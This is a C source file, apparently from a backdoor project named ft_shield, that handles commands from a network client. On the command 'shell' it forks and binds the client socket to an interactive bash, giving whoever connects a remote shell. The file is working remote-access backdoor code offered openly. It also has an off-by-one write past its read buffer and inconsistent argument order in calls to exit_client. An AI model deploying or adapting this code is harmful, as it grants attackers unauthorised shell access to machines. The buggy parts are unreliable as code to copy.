#include "../ft_shield.h"

int	g_shelllvl = 0;
int	g_shelling = 0;
int	g_shells[1024];

void	prompt(int fd)
{
	if (!g_shells[fd])
		write(fd, PROMPT, sizeof PROMPT);
}

void	shell(int cfd, int epfd)
{
	pid_t	mypid;
	pid_t	cpid;

	g_shells[cfd] = 1;
	++g_shelllvl;
	mypid = getpid();
	if (fork() == 0)
	{
		cpid = fork();
		if (cpid == 0)
		{
			dup2(cfd, STDIN_FILENO);
			dup2(cfd, STDOUT_FILENO);
			dup2(cfd, STDERR_FILENO);
			execl("/bin/bash", "bash", "-i", NULL);
		}
		else
		{
			waitpid(cpid, NULL, 0);
			kill(mypid, SIGUSR1);
			exit_client(cfd, epfd);
		}
	}
}

void	handle_command(int cfd, int epfd)
{
	char	buf[4096];
	ssize_t	n;

	n = read(cfd, buf, sizeof buf);
	if (n <= 0)
		return ;
	buf[n] = 0;
	if (strcmp(buf, "?\n") == 0)
		write(cfd, HELP, sizeof HELP);
	else if (strcmp(buf, "shell\n") == 0)
	{
		write(cfd, SHELL_MSG, sizeof SHELL_MSG);
		g_shelling = 1;
		exit_client(epfd, cfd);
	}
	else if (strcmp(buf, "\n"))
	{
		write(cfd, UNKNOWN_CMD_MSG, sizeof UNKNOWN_CMD_MSG);
	}
	prompt(cfd);
}
